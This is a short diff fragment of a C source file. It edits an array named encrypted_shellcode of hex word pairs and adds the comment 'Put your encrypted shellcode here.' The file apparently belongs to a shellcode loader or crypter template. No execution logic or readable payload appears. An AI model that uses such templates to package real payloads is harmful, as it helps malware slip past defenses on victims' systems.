@@ -84,7 +84,7 @@ WORD encrypted_shellcode[][2] = \
 { 0xcbd6df62 , 0xf92f6015 },
 { 0xc7d9b5ea , 0xf3e3c725 },
 { 0xeced1abb , 0x297a9033 },
-{ 0x9cd885f4 , 0xbfca8a01 },
+{ 0x9cd885f4 , 0xbfca8a01 },		// Put your encrypted shellcode here.
 { 0x1de86a62 , 0x413452fe },
 { 0xbdc32b1b , 0x7cb99fd2 },
 { 0x68dae4d6 , 0x14b392d5 },
